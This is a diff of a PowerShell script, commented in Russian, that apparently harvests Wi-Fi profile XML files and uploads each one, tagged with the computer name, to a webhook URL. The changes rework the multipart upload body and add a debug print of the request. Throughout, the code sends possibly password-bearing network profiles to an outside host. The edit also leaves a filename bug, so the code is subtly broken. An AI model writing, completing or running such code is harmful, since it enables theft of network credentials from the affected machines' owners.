@@ -39,11 +39,8 @@ foreach ($xmlFile in $xmlFiles) {
     # Подготовьте данные
     $formData = @{
         "username" = "$env:COMPUTERNAME"
-        "content"  = "Вот профиль Wi-Fi: $($xmlFile.Name)"
-    }
-
-    $formDataFiles = @{
-        "file" = New-Object System.IO.FileInfo($xmlFile.FullName)
+        "content"  = "Профиль Wi-Fi: $($xmlFile.Name)"
+        "file"     = $xmlFile.FullName
     }
 
     # Установите заголовок для multipart/form-data
@@ -61,10 +58,10 @@ foreach ($xmlFile in $xmlFiles) {
 
     # Добавьте файл
     $body += "--$boundary`r`n"
-    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formDataFiles['file'].Name)`"`r`n"
+    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formData['file'].Name)`"`r`n"
     $body += "Content-Type: application/octet-stream`r`n"
     $body += "`r`n"
-    $body += [System.IO.File]::ReadAllText($formDataFiles['file'].FullName)
+    $body += [System.IO.File]::ReadAllText($formData['file'])
     $body += "`r`n"
     $body += "--$boundary--`r`n"
 
@@ -73,7 +70,10 @@ foreach ($xmlFile in $xmlFiles) {
 
     # Отправьте запрос
     try {
-        # Укажите новый URL вебхука через прокси
+        # Выведите тело запроса
+        Write-Host "Тело запроса: $body"
+
+        # Отправьте запрос на вебхук
         $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
             "Content-Type" = $contentType
         }
